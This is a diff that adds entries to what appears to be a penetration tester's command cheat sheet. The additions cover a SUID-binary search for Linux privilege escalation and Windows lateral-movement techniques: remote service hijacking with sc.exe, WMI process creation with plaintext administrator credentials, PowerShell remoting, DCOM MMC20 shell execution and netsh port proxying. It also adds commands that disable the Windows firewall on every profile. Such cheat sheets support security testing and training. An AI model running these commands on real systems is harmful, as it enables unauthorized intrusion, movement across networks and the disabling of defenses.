@@ -148,6 +148,31 @@ host -l domain.com <nameserver>
 rpcinfo -p 10.0.0.1
 showmount -e 10.0.0.1
 
+# Find SUID Files (Linux)
+find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null | grep -Ev "umount|su|mount|sudo|passwd|exim4|chfn|chsh|procmail|newgrp|ping|ntfs-3g|pppd|pkexec|ssh-keysign|dbus-daemon-launch-helper|uuidd|pt_chown|at|mtr|dmcrypt-get-device|traceroute6.iputils|polkit-resolve-exe-helper|polkit-set-default-helper|polkit-grant-helper-pam"
+
+# Lateral Movement Windows Service (Windows)
+sc.exe \\REMOTE config TrustedInstaller start= auto
+sc.exe \\REMOTE config TrustedInstaller binPath= "cmd.exe /C lol"
+sc.exe \\REMOTE start TrustedInstaller
+
+# Lateral Movement WMI Exec (Windows)
+wmic /node:10.0.0.6 /user:administrator /password:password process call create "cmd.exe /c calc"
+
+# Lateral Movement with Powershell/WinRM (Windows)
+New-PSSession -ComputerName dc-mantvydas -Credential Domain\Username
+
+# Lateral Movement with DCOM (Windows)
+$a = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","10.0.0.1"))
+$a.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c hostname","7")
+
+# Netsh Portproxy (Windows)
+netsh interface portproxy add v4tov4 listenport=9090 listenaddress=192.168.0.100 connectaddress=192.168.1.200 connectport=9095
+
+# Disable Firewall (Windows)
+netsh advfirewall set currentprofile state off
+netsh advfirewall set allprofiles state off
+
 # TODO: Add WMI queries and netsh/netsh forwarding
 
 
